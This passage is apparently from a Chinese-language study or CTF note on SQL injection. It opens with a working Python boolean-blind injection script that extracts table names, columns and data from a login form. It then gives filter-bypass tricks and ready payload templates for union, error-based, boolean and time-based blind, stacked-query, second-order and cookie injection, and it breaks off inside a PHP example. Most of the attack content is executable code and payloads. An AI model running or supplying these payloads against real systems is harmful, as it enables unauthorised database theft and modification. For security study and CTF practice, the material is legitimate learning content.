table_schema = DATABASE() LIMIT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_index<span class="token punctuation">&#125;</span></span><span class="token string">,1), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_index<span class="token punctuation">&#125;</span></span><span class="token string">, 1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, 0, 1) -- "</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'random_password'</span>  <span class="token comment"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                <span class="token keyword">if</span> <span class="token string">"用户名或密码错误"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                    head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                    tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">if</span> head <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 检测到 ASCII 0 时结束当前表名</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            current_table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            char_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> current_table<span class="token punctuation">:</span>  <span class="token comment"># 无更多表时退出循环</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        result <span class="token operator">+=</span> current_table <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        table_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment"># 提取列名</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">def</span> <span class="token function">extract_column_name</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    column_index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 列的索引，从 0 开始</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        char_index <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        current_column <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>            head <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ASCII 起始值</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            tail <span class="token operator">=</span> <span class="token number">127</span>  <span class="token comment"># ASCII 结束值</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="53"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                <span class="token comment"># 构造注入 payload</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">' LIMIT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_index<span class="token punctuation">&#125;</span></span><span class="token string">,1), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_index<span class="token punctuation">&#125;</span></span><span class="token string">, 1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, 0, 1) -- "</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'random_password'</span>  <span class="token comment"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>                <span class="token keyword">if</span> <span class="token string">"用户名或密码错误"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="61"></td><td><pre>                    head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="62"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>                    tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="64"></td><td><pre>            <span class="token keyword">if</span> head <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 检测到 ASCII 0 时结束当前列名</span></pre></td></tr><tr><td data-num="65"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="66"></td><td><pre>            current_column <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>            char_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> current_column<span class="token punctuation">:</span>  <span class="token comment"># 无更多列时退出循环</span></pre></td></tr><tr><td data-num="70"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        result <span class="token operator">+=</span> current_column <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        column_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre><span class="token comment"># 提取数据</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> column_name<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    data_index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 数据的索引，从 0 开始</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        char_index <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        current_data <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="85"></td><td><pre>            head <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># ASCII 起始值</span></pre></td></tr><tr><td data-num="86"></td><td><pre>            tail <span class="token operator">=</span> <span class="token number">127</span>  <span class="token comment"># ASCII 结束值</span></pre></td></tr><tr><td data-num="87"></td><td><pre>            <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="88"></td><td><pre>                mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="89"></td><td><pre>                <span class="token comment"># 构造注入 payload</span></pre></td></tr><tr><td data-num="90"></td><td><pre>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>                    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' OR IF(ASCII(SUBSTRING((SELECT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string"> FROM </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> LIMIT </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data_index<span class="token punctuation">&#125;</span></span><span class="token string">,1), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char_index<span class="token punctuation">&#125;</span></span><span class="token string">, 1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, 0, 1) -- "</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="92"></td><td><pre>                    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'random_password'</span>  <span class="token comment"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num="93"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>                <span class="token keyword">if</span> <span class="token string">"用户名或密码错误"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="96"></td><td><pre>                    head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="98"></td><td><pre>                    tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="99"></td><td><pre>            <span class="token keyword">if</span> head <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 检测到 ASCII 0 时结束当前数据</span></pre></td></tr><tr><td data-num="100"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="101"></td><td><pre>            current_data <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre>            char_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="103"></td><td><pre></pre></td></tr><tr><td data-num="104"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> current_data<span class="token punctuation">:</span>  <span class="token comment"># 无更多数据时退出循环</span></pre></td></tr><tr><td data-num="105"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="106"></td><td><pre>        result <span class="token operator">+=</span> current_data <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="107"></td><td><pre>        data_index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="108"></td><td><pre></pre></td></tr><tr><td data-num="109"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="110"></td><td><pre></pre></td></tr><tr><td data-num="111"></td><td><pre><span class="token comment"># 主函数</span></pre></td></tr><tr><td data-num="112"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="113"></td><td><pre>        <span class="token comment"># 提取表名</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"提取表名中..."</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="115"></td><td><pre>    tables <span class="token operator">=</span> extract_table_name<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取到的表名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="117"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>tables<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="118"></td><td><pre></pre></td></tr><tr><td data-num="119"></td><td><pre>    <span class="token comment"># 提取列名</span></pre></td></tr><tr><td data-num="120"></td><td><pre>    table_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入要提取列名的表名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> 的列名中..."</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    columns <span class="token operator">=</span> extract_column_name<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取到的列名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>columns<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre></pre></td></tr><tr><td data-num="126"></td><td><pre>    <span class="token comment"># 提取数据</span></pre></td></tr><tr><td data-num="127"></td><td><pre>    column_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入要提取数据的列名："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="128"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> 中列 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string"> 的数据中..."</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="129"></td><td><pre>    data <span class="token operator">=</span> extract_data<span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> column_name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="130"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取到的数据："</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="131"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="零绕过方式"><a class="anchor" href="#零绕过方式">#</a> 零。绕过方式</h2>
<blockquote>
<blockquote>
<p><strong>大小写绕过</strong>：比如过滤 select 时，在不区分大小写时候可以 Select 绕过</p>
</blockquote>
<blockquote>
<p><strong>双写绕过</strong>：过滤关键字可以用 selselctect 来绕过</p>
</blockquote>
<blockquote>
<p><strong>空格绕过</strong>：</p>
<p>○/**/ 可以代替空格当空格被过滤的时候</p>
<p>例如：select/**/user/**/from/**/users;</p>
<p>○可以使用 Tab 代替空格</p>
<p>○可以使用空格 url 编码 %20</p>
<p>○如果空格被过滤，括号没有被过滤，可以用括号绕过</p>
<p>例如：select (user) from (users);</p>
</blockquote>
<blockquote>
<p><strong>= 被过滤</strong>：可以用 like 或 rlike，也可以用 regexp（正则来匹配）来绕过</p>
<p>比如 ='admin' 就可以 like'admin'</p>
</blockquote>
<blockquote>
<p><strong>select 被过滤</strong>：可以使用 desc 倒序查看表内的字段，也可以 showcolumnsfrom 表名。当需要查看具体信息的时候，可以使用预处理语句（堆叠注入查询）</p>
</blockquote>
<blockquote>
<p><strong>编码绕过</strong>：两次 URL 全编码</p>
</blockquote>
</blockquote>
<h2 id="一联合注入"><a class="anchor" href="#一联合注入">#</a> 一。联合注入</h2>
<h3 id="格式"><a class="anchor" href="#格式">#</a> 格式</h3>
<pre><code class="language-mysql">' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = DATABASE() -- 
</code></pre>
<blockquote>
<p>union 内部的 select 语句<strong>必须拥有相同数量的列</strong>。列也必须拥有相似的数据类型。</p>
<p>同时，每条 select 语句中的列的顺序必须是相同的。</p>
</blockquote>
<p>有时返回的不是我们想要的数据，请记住返回值（要显示的那个！）在原查询的位置</p>
<p>在进行联合查询时，同位置的就会覆盖显示过去（尽管可能都不在一个表，不是一个名）</p>
<h3 id="一些小部件"><a class="anchor" href="#一些小部件">#</a> 一些小部件</h3>
<h4 id="1order-by"><a class="anchor" href="#1order-by">#</a> 1.order by</h4>
<p>除了关键字 DESC, 还可以：</p>
<p><code>order by column_name/数字（对应第几列）</code></p>
<p><strong>不存在（名字 or 列数）会报错</strong></p>
<h4 id="2concat"><a class="anchor" href="#2concat">#</a> 2.concat</h4>
<p>拼接字符串，格式：</p>
<p><code>concat(str1，str2)</code></p>
<p>其中一个为 null，就会直接返回 null</p>
<h4 id="3group_concat"><a class="anchor" href="#3group_concat">#</a> 3.group_concat</h4>
<p>格式：</p>
<pre><code class="language-mysql">group_concat([distinct]要连接的字段[order by 排序字段 asc/desc][separator ‘分隔符’])
</code></pre>
<p><code>distinct</code> 	去重</p>
<p>分隔符默认是逗号</p>
<h4 id="4group-by"><a class="anchor" href="#4group-by">#</a> 4.group by</h4>
<p>值得注意的是，MySQL 实现这个是通过建立一个临时空表</p>
<h4 id="5substr"><a class="anchor" href="#5substr">#</a> 5.substr</h4>
<p>格式：substr (string，start，length)</p>
<p>0 是第一个位置，负数从结尾指定位置开始</p>
<p>length 可选，默认是到结束位置</p>
<h4 id="6ascll"><a class="anchor" href="#6ascll">#</a> 6.ascll</h4>
<p>格式：ascii (str)</p>
<p>返回字符串最左边字符的 ascll</p>
<p><strong>只返回一个</strong></p>
<h4 id="7database"><a class="anchor" href="#7database">#</a> 7.database()</h4>
<p>当前使用的数据库，相当于使用该库名</p>
<h3 id="流程"><a class="anchor" href="#流程">#</a> 流程</h3>
<p>1. 判断注入点</p>
<p>用 ' 等尝试破环查询语句，看看回显（整型不用闭合）</p>
<p>// 整型都不用引号，字符型要注意闭合</p>
<p>2. 摸个表！</p>
<p>用上面的 order by 数字，看看到多少会报错（回显异常）</p>
<p>以及摸一摸回显的在第几个位置（实在不行直接 1，2，3 看回来哪个）</p>
<p>3. 开查！</p>
<blockquote>
<blockquote>
<pre><code class="language-mysql">&gt;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='数据库名称'
//查表名

&gt;id=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名称'
//查字段名（列名）

&gt;id=1 union select 1,2,字段名 from 表名
//查详细信息
</code></pre>
</blockquote>
</blockquote>
<h2 id="二报错注入"><a class="anchor" href="#二报错注入">#</a> 二。报错注入</h2>
<p>前提是会回显错误，可以乱写 SQL 试一试有没有显示报错</p>
<h3 id="1updatexml"><a class="anchor" href="#1updatexml">#</a> 1.updatexml()</h3>
<h4 id="模板"><a class="anchor" href="#模板">#</a> 模板</h4>
<blockquote>
<p>select * from major where id=1 and updatexml(1,concat(0x26,(select database()),0x26),3)</p>
</blockquote>
<h4 id="语法"><a class="anchor" href="#语法">#</a> 语法</h4>
<p>updatexml（xml_documat，XPath_string，new_value）</p>
<p><code>xml_documat</code> ：string，为 XML 文档对象的名称，这一项可以输入一个十六进制的字符，比如 0x26（&amp;）。</p>
<p><code>XPath_string</code> ：XPath（一种字符串格式），报错注入时需要写入错误的格式来显示错误的信息。</p>
<p>new_value：string，替换查找到符合条件的数据，在注入时可以加入任意字符，比如 0x26（&amp;）</p>
<h4 id="原理"><a class="anchor" href="#原理">#</a> 原理</h4>
<p>用 0x26 开头，显然不是 XPath 格式，这是报错。</p>
<p>XPath 格式出错会返回其内容，因此用 concat 把我们要的东西连在 0x26 后</p>
<h3 id="2extractvalue"><a class="anchor" href="#2extractvalue">#</a> 2.extractvalue()</h3>
<h4 id="模板-2"><a class="anchor" href="#模板-2">#</a> 模板</h4>
<blockquote>
<p>select * from major where id=1 and extractvalue(1,concat(0x26,(selectdatabase()),0x26)</p>
</blockquote>
<h4 id="语法-2"><a class="anchor" href="#语法-2">#</a> 语法</h4>
<p>extractvalue（xml_documat，XPath_string）</p>
<p>原理同上</p>
<h2 id="三布尔盲注"><a class="anchor" href="#三布尔盲注">#</a> 三。布尔盲注</h2>
<h3 id="流程-2"><a class="anchor" href="#流程-2">#</a> 流程</h3>
<h4 id="1查数据库"><a class="anchor" href="#1查数据库">#</a> 1. 查数据库</h4>
<pre><code class="language-mysql">id=1 and (length(database())&gt;3    
-- 查长度         
          
id=1 and (ascii(substr(database(),1,1))&gt;110   
-- 查具体字符
</code></pre>
<h4 id="2查表"><a class="anchor" href="#2查表">#</a> 2. 查表</h4>
<pre><code class="language-mysql">1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0  
-- 查表数，加limit子句分页输出，改变起始位置，长度不变，直到报错（不存在当然无法比较）

1 and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit0,1),1,1))=110
-- 查表名
</code></pre>
<h4 id="3查字段"><a class="anchor" href="#3查字段">#</a> 3. 查字段</h4>
<p>假设查出的表名是 flag</p>
<pre><code class="language-mysql">1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1
-- 查列数

1 and ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot; [and ordinal_position = 1]),1,1))=102
-- 查列名，同样通过改start参数来换位置,改ordinal_position来查询其他列
</code></pre>
<h4 id="4查数据"><a class="anchor" href="#4查数据">#</a> 4. 查数据</h4>
<p>假设查出来的列名也是 flag</p>
<pre><code class="language-mysql">1 and(select count(flag) from flag)=1
-- 查有多少个字段信息（多少非空行）

1 and ascii(substr((select flag from flag limit 0,1),32,1))
-- 查字段信息有多长，改substr的start来判断长度，改limit的start来换行

1 and ascii(substr((select flag from flag limit0,1),1,1))=99
-- 查具体字段信息
</code></pre>
<p>很显然，你并不必要查名字或者字段信息的长度，因为不存在也无法比较</p>
<p>对于字符信息，也可以用 ascii 值为 0 来当作结束条件。</p>
<h3 id="判断"><a class="anchor" href="#判断">#</a> 判断</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span> <span class="token string">"用户名或密码错误"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    tail <span class="token operator">=</span> mid</pre></td></tr></table></figure><h2 id="四时间盲注"><a class="anchor" href="#四时间盲注">#</a> 四。时间盲注</h2>
<p>和布尔盲注类似，但是不依赖固定的返回值</p>
<p>两者只有判断条件的不同</p>
<pre><code class="language-mysql">IF(ASCII(SUBSTRING((SELECT &#123;column_name&#125; FROM &#123;table_name&#125; LIMIT &#123;data_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0)
#对于布尔盲注，要把sleep(3)改为1，来返回真，此后判断返回值是否含有错误时的内容来判断
</code></pre>
<p>时间盲注是：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>elapsed_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span> elapsed_time <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    tail <span class="token operator">=</span> mid</pre></td></tr></table></figure><h2 id="五堆叠查询注入"><a class="anchor" href="#五堆叠查询注入">#</a> 五。堆叠查询注入</h2>
<h3 id="模板-3"><a class="anchor" href="#模板-3">#</a> 模板</h3>
<pre><code class="language-mysql">1';select * from major;#
</code></pre>
<h3 id="流程select被过滤"><a class="anchor" href="#流程select被过滤">#</a> 流程（select 被过滤）</h3>
<p><code>show databases</code></p>
<p><code>show tables</code></p>
<p>desc `表名`</p>
<p>或者</p>
<p>show columns from `表名`</p>
<p>sEt @a=concat (&quot;sel&quot;,&quot;ect 列名 from` 表名 `&quot;);PRepare hello from @a;execute hello</p>
<p>------- 多次堆叠和预处理语句</p>
<h3 id="原理-2"><a class="anchor" href="#原理-2">#</a> 原理</h3>
<p>SQL 语句可以堆叠，多语句分号隔开，这也导致你其实可以直接修改数据库......</p>
<p>加上盲注的几个，就可以窃取 + 修改（可刑可拷）</p>
<h3 id="ex预处理语句"><a class="anchor" href="#ex预处理语句">#</a> EX. 预处理语句</h3>
<p>一种特殊的 SQL 处理方式；预处理不会直接执行 SQL 语句，而是先将 SQL 语句编译，生成执行计划，然后通过 Execute 命令携带 SQL 参数来执行 SQL 语句</p>
<p>模板：</p>
<pre><code class="language-mysql">@a prepare xxx as select * from user where id=1;  -- 将select查询语句(@a)定义为xxx 
然后就
execute xxx -- 执行@a语句，为了避免过滤，上面使用concat来组成select
可以用set来对@a参数赋值（可见concat的返回值就是结果）
</code></pre>
<h2 id="六二次注入"><a class="anchor" href="#六二次注入">#</a> 六。二次注入</h2>
<p>用于注册加登录加可以改密的页面，所以叫二次</p>
<p>注册时加点特殊字符</p>
<p>比如用户名 &amp; 密码设为：</p>
<p>'admin123&quot;\</p>
<p>如果登录后改密会<strong>报错</strong>，说明可以二次注入</p>
<p>然后：</p>
<p>只要在用户名处用报错注入</p>
<p>修改密码的时候就会触发（密码都是随便填，但要记住，登录要用）</p>
<h2 id="七cookie注入"><a class="anchor" href="#七cookie注入">#</a> 七.cookie 注入</h2>
<p><strong>本质上只是注入点不同</strong></p>
<p>一种变体，只有参数用 cookie 传递的时候才能用</p>
<p>比如:</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$user_id</span></span>'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token delimiter 